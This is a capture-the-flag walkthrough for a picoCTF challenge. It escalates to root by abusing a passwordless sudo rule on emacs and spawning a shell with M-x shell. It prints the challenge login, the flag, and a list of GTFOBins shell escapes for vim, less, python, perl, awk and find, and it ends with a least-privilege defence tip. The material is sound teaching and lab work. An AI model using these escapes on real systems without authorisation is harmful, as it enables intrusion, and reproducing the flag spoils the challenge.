Challenge Overview

You are given SSH access to a remote machine. A flag.txt file exists on the system but is owned by root and unreadable by the ctf-player user. The goal is to leverage misconfigured sudo permissions to escalate privileges and read the flag.

The challenge name is a reference to the classic xkcd comic #149 — where a sandwich is only made after the magic word sudo is invoked. Here, we do exactly that: use sudo to do something we normally can't.

Core concept: Certain programs allowed via sudo can spawn interactive shells — giving you a root shell without needing the root password. This class of technique is documented on GTFOBins.

1

Step 1 — SSH Into the Instance

Connect to the challenge server using the credentials provided in the challenge panel:

bash · terminal
ssh -p 60702 ctf-player@green-hill.picoctf.net
# Password: 8b23dc85

Note: You may see a warning about post-quantum key exchange algorithms — this is safe to ignore for the purpose of this challenge. Enter the password when prompted.

2

Step 2 — Attempt to Read the Flag

Once connected, you'll see a flag.txt file listed in the home directory. Try to read it directly:

bash
ls
flag.txt

cat flag.txt
cat: flag.txt: Permission denied

As expected — the file is owned by root, and our user doesn't have read permission. We need to find another way in.

3

Step 3 — Enumerate Sudo Permissions

Check what commands the current user is allowed to run with elevated privileges using sudo -l:

bash
sudo -l

Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs

Critical finding: The user can run /bin/emacs as any user (including root) with no password required. This is a classic misconfiguration — emacs is a full text editor that can execute shell commands.

4

Step 4 — Launch Emacs as Root

Open the emacs editor with root privileges via sudo:

bash
sudo /bin/emacs

GNU Emacs will launch. You will see the Emacs welcome screen — this editor is now running as root, which means any shell it spawns will also be a root shell.

5

Step 5 — Escape to a Root Shell

Emacs has a built-in shell mode. We use the M-x (Meta + x) keybind to invoke Emacs commands:

①
Press Alt + X (or Esc then X)
This opens the Emacs command mini-buffer at the bottom of the screen. The M-x notation means the Meta key, which is Alt on most modern keyboards.
②
Type shell and press Enter
This invokes the built-in M-x shell command, which opens an interactive shell buffer inside Emacs — running as the current process owner: root.
③
You now have a root shell inside Emacs
The Emacs shell buffer gives you a fully interactive terminal running as root. You can now execute any command on the system.

Alternative shortcut: You can also use M-x eshell to open Emacs' built-in Eshell, which also runs as root. Both methods work.

6

Step 6 — Read the Flag

Inside the root shell spawned by Emacs, run the same command that failed before:

bash · emacs shell (root)
cat flag.txt
picoCTF{ju57_5ud0_17_9a782247}

Other Vulnerable Binaries (GTFOBins)

This technique is not limited to emacs. Any editor or pager that can execute arbitrary code is dangerous when granted unchecked sudo access. The GTFOBins project documents hundreds of such binaries:

vim / vi
:!bash or :shell
nano
^R ^X then reset
less
!bash from prompt
man
!bash from viewer
python3
os.system('/bin/sh')
perl
exec '/bin/sh'
awk
BEGIN {system('/bin/sh')}
find
-exec /bin/sh \;

Defence tip: Always apply the principle of least privilege. Users should only be granted sudo access to the minimum set of commands they actually need — and never to editors, interpreters, or tools capable of spawning arbitrary processes.

✦

Key Takeaway

Lesson Learned

Sudo misconfigurations are one of the most common and immediately exploitable privilege escalation vectors in CTFs and real-world systems. Whenever you land on a Linux box, sudo -l should be one of the first commands you run.

Text editors like emacs, vim, and nano are general-purpose execution environments — they can run shell commands, execute scripts, and open network connections. Granting unrestricted sudo access to any of these is functionally equivalent to giving root shell access.

Always cross-reference discovered sudo permissions with gtfobins.github.io — it covers escape techniques for hundreds of common binaries.
